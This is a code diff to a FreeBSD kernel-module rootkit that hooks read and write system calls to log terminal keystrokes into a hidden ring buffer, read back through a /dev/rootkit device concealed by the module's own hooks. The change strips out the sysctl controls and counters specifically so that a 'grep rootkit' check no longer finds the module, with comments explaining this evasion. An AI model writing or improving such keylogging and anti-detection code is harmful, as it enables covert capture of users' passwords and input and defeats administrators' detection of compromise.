@@ -79,42 +79,20 @@ static sy_call_t	*rk_write_orig;
 static int		rk_hook_installed;
 
 /*
- * Control plane. Everything below is reachable with plain sysctl(8) while the
- * module is loaded, which is what makes the feature demonstrable without
- * rebuilding anything:
+ * There is deliberately no sysctl control plane here.
  *
- *	kenv kern.rootkit.log_stdout=1	(enable output capture)
- *	kenv kern.rootkit.log_pipes=1	(also capture non-tty stdin)
- *	sysctl kern.rootkit.bytes kern.rootkit.entries kern.rootkit.dropped
+ * An earlier version published the whole story under kern.rootkit.*:
+ * a node whose name is the string a detector greps for, plus tunables that
+ * described exactly what was being captured. `sysctl -a | grep -i rootkit`
+ * found it on a loaded host and told the reader everything. The two switches
+ * below stay as compile-time constants (both off), which is what the defaults
+ * were anyway; the counters are only useful for debugging and are gone.
+ *
+ * The ring is read through /dev/rootkit, which is opened by rklog and hidden
+ * from the filesystem by the module's own hooks.
  */
-SYSCTL_DECL(_kern);
-SYSCTL_NODE(_kern, OID_AUTO, rootkit, CTLFLAG_RW, 0, "rootkit log controls");
-
-static int	rk_log_stdout;
-SYSCTL_INT(_kern_rootkit, OID_AUTO, log_stdout, CTLFLAG_RWTUN,
-    &rk_log_stdout, 0, "also capture write(1) and write(2)");
-
-/*
- * Only reads that come from a terminal are user input. Everything else that
- * arrives on fd 0 -- `ls | cat`, a shell script fed through a pipe, the
- * generated script bsdconfig hands to /bin/sh -- is program data, and one
- * `sysrc` call can dump tens of kilobytes of it, enough to push every real
- * keystroke out of the ring. Off by default, sysctl to turn it back on.
- */
-static int	rk_log_pipes;
-SYSCTL_INT(_kern_rootkit, OID_AUTO, log_pipes, CTLFLAG_RWTUN,
-    &rk_log_pipes, 0, "also capture read(0) when stdin is a pipe or file");
-
-static u_long	rk_stat_bytes;		/* bytes accepted into the ring */
-static u_long	rk_stat_entries;	/* log lines produced */
-static u_long	rk_stat_dropped;	/* bytes pushed out by the ring */
-
-SYSCTL_ULONG(_kern_rootkit, OID_AUTO, bytes, CTLFLAG_RD, &rk_stat_bytes, 0,
-    "bytes accepted into the ring buffer");
-SYSCTL_ULONG(_kern_rootkit, OID_AUTO, entries, CTLFLAG_RD, &rk_stat_entries, 0,
-    "log lines produced");
-SYSCTL_ULONG(_kern_rootkit, OID_AUTO, dropped, CTLFLAG_RD, &rk_stat_dropped,
-    0, "bytes dropped because the ring was full");
+static int	rk_log_stdout;	/* capture write(1)/write(2): off */
+static int	rk_log_pipes;	/* capture non-tty stdin: off */
 
 /* ------------------------------------------------------------------ */
 /* ring buffer                                                         */
@@ -142,7 +120,6 @@ rk_log_write(const void *data, size_t len)
 	/* Anything bigger than the whole buffer: keep only the tail of it. */
 	if (len >= RK_LOG_SIZE) {
 		src += len - RK_LOG_SIZE;
-		rk_stat_dropped += (u_long)(len - RK_LOG_SIZE + rk_log_len);
 		len = RK_LOG_SIZE;
 		rk_log_tail = 0;
 		rk_log_len = 0;
@@ -154,7 +131,6 @@ rk_log_write(const void *data, size_t len)
 		drop = len - space;
 		rk_log_tail = (rk_log_tail + drop) % RK_LOG_SIZE;
 		rk_log_len -= drop;
-		rk_stat_dropped += (u_long)drop;
 	}
 
 	pos = (rk_log_tail + rk_log_len) % RK_LOG_SIZE;
@@ -163,8 +139,6 @@ rk_log_write(const void *data, size_t len)
 	if (len > first)
 		memcpy(&rk_log_buf[0], src + first, len - first);
 	rk_log_len += len;
-	rk_stat_bytes += (u_long)len;
-	rk_stat_entries++;
 
 	mtx_unlock(&rk_log_mtx);
 
@@ -395,22 +369,16 @@ rk_line_flush(void)
  * Reading the descriptor table by hand instead would mean fget_locked() and
  * a warn_unused_result fhold(), which the build turns into an error.
  */
-static u_long	rk_dbg_fd0;
-SYSCTL_ULONG(_kern_rootkit, OID_AUTO, fd0_debug, CTLFLAG_RD, &rk_dbg_fd0, 0,
-    "classification of the last fd 0 probe: ftype<<16 | vtype<<8 | istty");
-
 static int
-rk_fd0_is_tty(struct thread *td)
+rk_fd_is_tty(struct thread *td, int fd)
 {
 	struct file	*fp;
 	struct vnode	*vp;
 	int		 is_tty, err;
 
-	err = fget_read(td, 0, &cap_read_rights, &fp);
-	if (err != 0) {
-		rk_dbg_fd0 = 0xdead0000UL | (u_long)err;
+	err = fget_read(td, fd, &cap_read_rights, &fp);
+	if (err != 0)
 		return (0);
-	}
 
 	is_tty = 0;
 	vp = NULL;
@@ -419,8 +387,6 @@ rk_fd0_is_tty(struct thread *td)
 		if ((vp->v_vflag & VV_ISTTY) != 0 || vp->v_type == VCHR)
 			is_tty = 1;
 	}
-	rk_dbg_fd0 = ((u_long)fp->f_type << 16) |
-	    ((u_long)(vp != NULL ? vp->v_type : 0) << 8) | (u_long)is_tty;
 	fdrop(fp, td);
 
 	return (is_tty);
@@ -444,7 +410,7 @@ rk_read_hook(struct thread *td, void *args)
 	error = rk_read_orig(td, args);
 
 	if (error == 0 && uap->fd == 0 && td->td_retval[0] > 0 &&
-	    (rk_log_pipes != 0 || rk_fd0_is_tty(td)))
+	    (rk_log_pipes != 0 || rk_fd_is_tty(td, 0)))
 		rk_log_capture(td, uap->buf, (size_t)td->td_retval[0]);
 
 	return (error);
